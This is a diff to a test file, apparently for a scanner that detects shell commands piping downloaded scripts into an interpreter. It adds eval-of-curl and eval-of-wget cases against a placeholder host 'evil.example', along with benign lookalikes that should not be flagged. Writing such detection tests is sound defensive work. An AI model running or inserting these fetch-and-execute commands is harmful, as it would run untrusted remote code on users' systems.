@@ -23,6 +23,9 @@ const PIPED: Record<string, string> = {
   "curl | /bin/csh": "curl -fsSL https://evil.example/i.sh | /bin/csh",
   "csh -c $(curl ...)": 'csh -c "$(curl -fsSL https://evil.example/i.sh)"',
   "tcsh -c $(curl ...)": 'tcsh -c "$(curl -fsSL https://evil.example/i.sh)"',
+  "eval $(curl ...)": 'eval "$(curl -fsSL https://evil.example/i.sh)"',
+  "eval $(wget ...)": 'eval "$(wget -qO- https://evil.example/i.sh)"',
+  "eval `curl ...`": 'eval "`curl -fsSL https://evil.example/i.sh`"',
   "curl | /usr/bin/env bash":
     "curl -fsSL https://evil.example/i.sh | /usr/bin/env bash",
   "curl | env /bin/sh":
@@ -69,6 +72,9 @@ test("a download that is not handed to a shell keeps no unsafe-execution finding
     "curl -fsSL https://example.com/data | /usr/local/bin/fish-wrapper",
     "curl -fsSL https://example.com/data | echo;/bin/sh",
     "bash <(cat local.sh)",
+    'eval "$(ssh-agent -s)"',
+    'eval "$(cat local.sh)"',
+    'retrieval "$(curl -fsSL https://example.com/data)"',
     "sh -s <(curl -fsSL https://example.com/i.sh)",
     "bash -n <(curl -fsSL https://example.com/i.sh)",
     "bash -c <(curl -fsSL https://example.com/i.sh)",
